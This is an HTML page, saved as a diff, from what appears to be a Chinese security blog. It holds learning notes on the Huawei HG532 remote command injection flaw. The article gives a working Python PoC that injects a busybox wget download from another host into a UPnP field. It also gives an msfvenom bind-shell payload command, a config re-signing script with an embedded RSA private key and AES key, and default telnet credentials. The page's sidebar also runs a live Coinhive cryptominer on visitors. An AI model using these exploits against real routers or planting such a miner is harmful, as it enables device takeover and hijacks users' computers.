@@ -1,0 +1,842 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>华为HG532远程命令执行漏洞 学习笔记 | xd_xd&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="xd_xd">
+    
+
+    
+    <meta name="description" content="漏洞原理参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。
+
+pocimport requests
+
+headers = {
+    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cef">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华为HG532远程命令执行漏洞 学习笔记">
+<meta property="og:url" content="http://xdxd.love/2018/02/10/华为HG532远程命令执行漏洞-学习笔记/index.html">
+<meta property="og:site_name" content="xd_xd's blog">
+<meta property="og:description" content="漏洞原理参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。
+
+pocimport requests
+
+headers = {
+    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cef">
+<meta property="og:image" content="http://xdxd.love/images/hg5321.png">
+<meta property="og:image" content="http://xdxd.love/images/hg5322.png">
+<meta property="og:image" content="http://xdxd.love/images/hg5323.png">
+<meta property="og:image" content="http://xdxd.love/images/hg5324.png">
+<meta property="og:image" content="http://xdxd.love/images/hg5325.png">
+<meta property="og:image" content="http://xdxd.love/images/hg5326.png">
+<meta property="og:image" content="http://xdxd.love/images/hg5327.png">
+<meta property="og:updated_time" content="2018-02-10T08:18:44.892Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="华为HG532远程命令执行漏洞 学习笔记">
+<meta name="twitter:description" content="漏洞原理参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。
+
+pocimport requests
+
+headers = {
+    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cef">
+
+    
+    <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+    <style>
+    pre {white-space: pre-wrap;}
+    </style>
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="xd_xd&#39;s blog" title="xd_xd&#39;s blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="xd_xd&#39;s blog">xd_xd&#39;s blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:xdxd.love">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/02/10/华为HG532远程命令执行漏洞-学习笔记/" title="华为HG532远程命令执行漏洞 学习笔记" itemprop="url">华为HG532远程命令执行漏洞 学习笔记</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
+		
+  <p class="article-time">
+    <time datetime="2018-02-10T08:15:07.000Z" itemprop="datePublished"> 發表於 Feb 10 2018</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目錄</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell获取"><span class="toc-number">3.</span> <span class="toc-text">shell获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试"><span class="toc-number">4.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开启telent"><span class="toc-number">5.</span> <span class="toc-text">开启telent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方案"><span class="toc-number">6.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他分析资料学习与反思"><span class="toc-number">7.</span> <span class="toc-text">其他分析资料学习与反思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="漏洞原理">漏洞原理</h2><p>参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。</p>
+<p><img src="/images/hg5321.png" alt=""></p>
+<h2 id="poc">poc</h2><pre><code><span class="xml">import requests
+
+headers = </span><span class="expression">{
+    <span class="string">"Authorization"</span>: <span class="string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span>
+}</span><span class="xml">
+
+data = '''<span class="pi">&lt;?xml version="1.0" ?&gt;</span>
+ <span class="tag">&lt;<span class="title">s:Envelope</span> <span class="attribute">xmlns:s</span>=<span class="value">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attribute">s:encodingStyle</span>=<span class="value">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span>
+  <span class="tag">&lt;<span class="title">s:Body</span>&gt;</span><span class="tag">&lt;<span class="title">u:Upgrade</span> <span class="attribute">xmlns:u</span>=<span class="value">"urn:schemas-upnp-org:service:WANPPPConnection:1"</span>&gt;</span>
+   <span class="tag">&lt;<span class="title">NewStatusURL</span>&gt;</span>;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;<span class="tag">&lt;/<span class="title">NewStatusURL</span>&gt;</span>
+   <span class="tag">&lt;<span class="title">NewDownloadURL</span>&gt;</span>HUAWEIUPNP<span class="tag">&lt;/<span class="title">NewDownloadURL</span>&gt;</span>
+  <span class="tag">&lt;/<span class="title">u:Upgrade</span>&gt;</span>
+ <span class="tag">&lt;/<span class="title">s:Body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">s:Envelope</span>&gt;</span>
+'''
+requests.post('http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)</span>
+</code></pre><h2 id="shell获取">shell获取</h2><p>使用msfvenom生成payload。 </p>
+<pre><code><span class="comment">msfvenom</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">format</span> <span class="comment">elf</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">arch</span> <span class="comment">mipsbe</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">platform</span> <span class="comment">linux</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">payload</span> <span class="comment">linux/mipsbe/shell_bind_tcp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">out</span> <span class="comment">payload</span><span class="string">.</span><span class="comment">elf</span> 
+</code></pre><p><img src="/images/hg5322.png" alt=""></p>
+<p>修改poc，下载payload执行可以获得shell。</p>
+<p><img src="/images/hg5323.png" alt=""></p>
+<h2 id="动态调试">动态调试</h2><p><img src="/images/hg5324.png" alt=""></p>
+<h2 id="开启telent">开启telent</h2><p>该款路由器默认不开启telent。可以通过修改配置文件的方式开启telent。先下载配置文件，配置文件是加密的。使用一下脚本解密。脚本为网上开源。</p>
+<pre><code><span class="comment">#!/usr/bin/python</span>
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> os
+<span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify
+<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
+<span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256
+<span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number
+
+
+RSA_D = <span class="string">"1B18D0048611500CA489C51D7389B19A"</span> \
+    <span class="string">"F977E6F5BB8DD5E61A62E339499E6237"</span> \
+    <span class="string">"C234740129EBD25EF226AB7E498A0830"</span> \
+    <span class="string">"DF0A5D45F19F5055B906EBC5E71C16C5"</span> \
+    <span class="string">"A99E36D4F369701FAE2403E445BA3CAE"</span> \
+    <span class="string">"4B0C9526A82EDD90FECD78B7EDD5EA5E"</span> \
+    <span class="string">"6C98A0C4CABF3148E99E78DA0D5EB972"</span> \
+    <span class="string">"6F1533A6738F47C790037D532F403C0D"</span>
+
+RSA_N = <span class="string">"A93591A1BFCB7615555C12CFE3AF0B68"</span> \
+    <span class="string">"5A6B94E8604A9441ABF7A5F268D4CBF9"</span> \
+    <span class="string">"6022E2F0694D679D2C8E4C2D4C3C0C44"</span> \
+    <span class="string">"60C5646E852A51EF7EBC2F0C88F08E80"</span> \
+    <span class="string">"6D991446348EB7AF280E607DDA363F4F"</span> \
+    <span class="string">"322E9B5005503F31F60353219F86443A"</span> \
+    <span class="string">"04E573FFEF541D21ADD1043E478D81B1"</span> \
+    <span class="string">"E79A5B434C5F64B3D5B141D7BEB59D71"</span>
+
+RSA_E = <span class="string">"010001"</span>
+
+SIG_TEMPLATE = <span class="string">"0001FFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"003021300906052B0E03021A05000420"</span>
+
+AES128CBC_KEY = <span class="string">"3E4F5612EF64305955D543B0AE350880"</span>
+AES128CBC_IV = <span class="string">"8049E91025A6B54876C3B4868090D3FC"</span>
+
+XML_VERSION_STRING = <span class="string">b'&lt;?xml version="1.0" ?&gt;'</span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">print_usage</span><span class="params">()</span>:</span>
+    print(<span class="string">"Usage : "</span> + sys.argv[<span class="number">0</span>] + <span class="string">" {encrypt | decrypt} input_file output_file"</span>)
+    sys.exit(<span class="number">1</span>)
+
+<span class="function"><span class="keyword">def</span> <span class="title">load_config</span><span class="params">(config_file)</span>:</span>
+    <span class="keyword">if</span> os.path.isfile(config_file):
+        cf = open(config_file, <span class="string">"rb"</span>)
+        config = cf.read()
+        cf.close()
+    <span class="keyword">else</span>:
+        print(<span class="string">"Config file not found..exiting"</span>)
+        sys.exit(<span class="number">1</span>)
+    <span class="keyword">return</span> config
+
+<span class="function"><span class="keyword">def</span> <span class="title">save_to_file</span><span class="params">(dest_file, data)</span>:</span>
+    wfile = open(dest_file,<span class="string">"wb"</span>)
+    wfile.write(data)
+    wfile.close()
+
+<span class="function"><span class="keyword">def</span> <span class="title">get_sha256_hash_from_sig</span><span class="params">(sig)</span>:</span>
+    sig_int = int(hexlify(sig),<span class="number">16</span>)
+    rsa_n = int(RSA_N,<span class="number">16</span>)
+    dec_sig_as_int = pow(sig_int, <span class="number">0x10001</span>, rsa_n );
+    decrypted_sig = number.long_to_bytes(dec_sig_as_int, <span class="number">128</span>)
+    target_sha256 = hexlify(decrypted_sig)[-<span class="number">64</span>:]
+    <span class="keyword">return</span> target_sha256
+
+<span class="function"><span class="keyword">def</span> <span class="title">calc_actual_sha256_hash</span><span class="params">(enc_config_body)</span>:</span>
+    sha256 = SHA256.new()
+    sha256.update(enc_config_body)
+    actual_sha256_sig = sha256.hexdigest()
+    actual_sha256_sig = str.encode(actual_sha256_sig)
+    <span class="keyword">return</span> actual_sha256_sig
+
+<span class="function"><span class="keyword">def</span> <span class="title">decrypt_body</span><span class="params">(enc_config_body)</span>:</span>
+    iv = unhexlify(AES128CBC_IV)
+    key= unhexlify(AES128CBC_KEY)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = cipher.decrypt(enc_config_body)
+    <span class="comment"># Strip block padding</span>
+    decrypted_data=decrypted_data.rstrip(<span class="string">b'\0'</span>)
+    <span class="keyword">return</span> decrypted_data
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">decrypt_config</span><span class="params">(input_file, output_file)</span>:</span>
+    enc_config=load_config(input_file)
+    sig = enc_config[:<span class="number">0x80</span>]
+    enc_config_body=enc_config[<span class="number">0x80</span>:]
+
+    print(<span class="string">"verifying signature..."</span>)
+    target_sha256_hash = get_sha256_hash_from_sig(sig)
+    actual_sha256_hash = calc_actual_sha256_hash(enc_config_body)
+
+    <span class="keyword">if</span> (actual_sha256_hash == target_sha256_hash):
+        print(<span class="string">"Signature ok..."</span>)
+    <span class="keyword">else</span>:
+        print(<span class="string">"Signature not ok...exiting"</span>)
+        sys.exit(<span class="number">1</span>)
+
+    print(<span class="string">"Decrypting..."</span>)
+    decrypted_data = decrypt_body(enc_config_body)
+
+    <span class="comment">#check_config(decrypted_data)</span>
+
+    print(<span class="string">"Saving decrypted config to "</span> + output_file + <span class="string">"..."</span>)
+    save_to_file(output_file, decrypted_data)
+
+<span class="comment">#def check_config(new_config_file):</span>
+<span class="comment">#    head = new_config_file[0:len(XML_VERSION_STRING)]</span>
+<span class="comment">#    if head != XML_VERSION_STRING:</span>
+<span class="comment">#        print("Not a valid config file...exiting")</span>
+<span class="comment">#        sys.exit(1)</span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">encrypt_config</span><span class="params">(input_file, output_file)</span>:</span>
+    new_config_file=load_config(input_file)
+
+    <span class="comment">#check_config(new_config_file)</span>
+
+    padding_amount = len(new_config_file) % <span class="number">32</span>
+    print(<span class="string">""</span> + str(padding_amount) + <span class="string">" bytes padding needed"</span>)
+    print(<span class="string">"Adding padding..."</span>)
+    new_config_file=new_config_file + <span class="string">b'\0'</span>*(<span class="number">32</span>-padding_amount)
+
+    print(<span class="string">"Encrypting config..."</span>)
+    iv = unhexlify(AES128CBC_IV)
+    key= unhexlify(AES128CBC_KEY)
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    enc_new_config = aes.encrypt(new_config_file)
+
+    print(<span class="string">"Calculating SHA256 hash..."</span>)
+    h = SHA256.new()
+    h.update(enc_new_config)
+    actual_sha256_sig = h.hexdigest()
+
+    sig = SIG_TEMPLATE+actual_sha256_sig;
+
+    print(<span class="string">"Encrypting Signature..."</span>)
+    sig_int = int(sig,<span class="number">16</span>)
+    rsa_d = int(RSA_D,<span class="number">16</span>)
+    rsa_n = int(RSA_N,<span class="number">16</span>)
+    enc_sig_int = pow(sig_int, rsa_d, rsa_n);
+
+    encrypted_sig = number.long_to_bytes(enc_sig_int, <span class="number">128</span>)
+    enc_config = encrypted_sig + enc_new_config
+
+    print(<span class="string">"Saving encrypted config to "</span> + output_file + <span class="string">"..."</span>)
+    save_to_file(output_file, enc_config)
+
+<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
+
+    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:
+        print_usage()
+
+    input_file = sys.argv[<span class="number">2</span>]
+    output_file = sys.argv[<span class="number">3</span>]
+    command = sys.argv[<span class="number">1</span>]
+
+    <span class="keyword">if</span> (command == <span class="string">"encrypt"</span>):
+        encrypt_config(input_file, output_file)
+    <span class="keyword">elif</span> (command == <span class="string">"decrypt"</span>):
+        decrypt_config(input_file, output_file)
+    <span class="keyword">else</span>:
+        print_usage()
+
+
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    main()
+</code></pre><p>修改配置文件之后，可能还需要修改防火墙策略，才可以连上telnet端口。</p>
+<p>telnet的用户名和密码为：!!Huawei          @HuaweiHgw<br>连上之后为一个自定义的shell，无法执行正常的shell命令。网上查到输入 welcome to shell可以获得正常shell。但是输入之后无任何信息返回，虽然没有获得shell，但是跟其他命令还是有区别。其他字符会返回command failed。<br><img src="/images/hg5325.png" alt=""></p>
+<h2 id="修复方案">修复方案</h2><p>其他华为官网上的新版本固件就不存在这个漏洞了。应该是重构了，大部分逻辑都改了。所以这个漏洞其实是不影响最新版的固件的。只是一个比较老的版本存在的问题。</p>
+<p><img src="/images/hg5326.png" alt=""></p>
+<h2 id="其他分析资料学习与反思">其他分析资料学习与反思</h2><p><a href="http://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/" target="_blank" rel="external">对华为HG532远程命令执行漏洞的新探索</a>中有两个新的点，一个是利用csrf实现漏洞利用。将用户名和密码放在url中完成认证，http:// dslf-config:admin @routerip:37215。这个方式在之前13年传播比较广的利用csrf修改dns的利用中就是这么实现的。再一个是利用DNS rebind技术绕过限制，获得自己需要的一些http header。</p>
+<p><a href="https://slab.qq.com/news/tech/1705.html" target="_blank" rel="external">腾讯蜜罐系统捕获高危IoT蠕虫Okiru</a> 文中也有对该漏洞的简要分析。文中提到利用0x22字符，试图对认证字符进行截断。我觉得这个推测应该是不正确，后文也并没有其他的依据可以证明这个推断。0x22就是http协议需要和xml协议中需要的双引号。没有绕过认证的作用。<br><img src="/images/hg5327.png" alt=""></p>
+<h2 id="参考资料">参考资料</h2><p><a href="https://paper.seebug.org/490/" target="_blank" rel="external">https://paper.seebug.org/490/</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<p>个人微信公众号</p>
+<img src="/images/coffee.png">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/万物互联/">万物互联</a>
+</div>
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://xdxd.love/2018/02/10/华为HG532远程命令执行漏洞-学习笔记/" data-title="华为HG532远程命令执行漏洞 学习笔记 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/02/02/安全圈怪现状读后感/"  title="安全圈怪现状读后感">
+ <strong>下一篇：</strong><br/> 
+ <span>安全圈怪现状读后感
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2018/02/10/华为HG532远程命令执行漏洞-学习笔记/" data-title="华为HG532远程命令执行漏洞 学习笔记" data-url="http://xdxd.love/2018/02/10/华为HG532远程命令执行漏洞-学习笔记/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目錄</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell获取"><span class="toc-number">3.</span> <span class="toc-text">shell获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试"><span class="toc-number">4.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开启telent"><span class="toc-number">5.</span> <span class="toc-text">开启telent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方案"><span class="toc-number">6.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他分析资料学习与反思"><span class="toc-number">7.</span> <span class="toc-text">其他分析资料学习与反思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<aside class="clearfix">
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+</div>
+
+  
+  <div class="widget-wrap">
+    <img src="/images/coffee.png" width="100%" height="100%"/>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('JEqHgeGovuDan86e2TgeOO65ITKCk93T', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>  
+  </div>
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分類</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/cve-and-others/" title="cve and others">cve and others<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/万物互联/" title="万物互联">万物互联<sup>15</sup></a></li>
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/人生苦短/" title="人生苦短">人生苦短<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码审计/" title="代码审计">代码审计<sup>29</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/前端安全/" title="前端安全">前端安全<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/加密解密/" title="加密解密">加密解密<sup>3</sup></a></li>
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/折腾不止/" title="折腾不止">折腾不止<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透测试/" title="渗透测试">渗透测试<sup>10</sup></a></li>
+		  
+		
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/移动安全/" title="移动安全">移动安全<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/黑盒测试/" title="黑盒测试">黑盒测试<sup>8</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">標簽</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mips/" title="mips">mips<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/万物互联/" title="万物互联">万物互联<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/支付漏洞/" title="支付漏洞">支付漏洞<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xss/" title="xss">xss<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ssi/" title="ssi">ssi<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tcpdump/" title="tcpdump">tcpdump<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/固件/" title="固件">固件<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/密码学/" title="密码学">密码学<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/折腾/" title="折腾">折腾<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/inspeckage/" title="inspeckage">inspeckage<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/csrf/" title="csrf">csrf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/github/" title="github">github<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xposed/" title="xposed">xposed<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/binwalk/" title="binwalk">binwalk<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php-wdcp/" title="php,wdcp">php,wdcp<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情鏈接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.heysec.org/" target="_blank" title="heysec.org">heysec.org</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://sco4x0.com" target="_blank" title="sco4x0&#39;s blog">sco4x0&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://virusdefender.net" target="_blank" title="virusdefender&#39;s blog">virusdefender&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackersb.cn/" target="_blank" title="Striker&#39;s blog">Striker&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.leavesongs.com/" target="_blank" title="离别歌">离别歌</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.stardustsky.net/" target="_blank" title="Stardustsky博客">Stardustsky博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.waitalone.cn/" target="_blank" title="独自等待">独自等待</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/S4b0r/" target="_blank" title="S4b0r&#39; blog">S4b0r&#39; blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.leesec.com/" target="_blank" title="leesec">leesec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://xss1.com/" target="_blank" title="0x_Jin">0x_Jin</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://bl4ck.in/" target="_blank" title="Tomato">Tomato</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackfun.org/" target="_blank" title="4ido10n">4ido10n</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.lynahex.com/" target="_blank" title="lynahex&#39;s blog">lynahex&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.codersec.net/" target="_blank" title="Bsmali4很忙">Bsmali4很忙</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.leanote.com/thorns" target="_blank" title="thorns">thorns</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+</aside>
+</div>
+    </div>
+    <footer></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
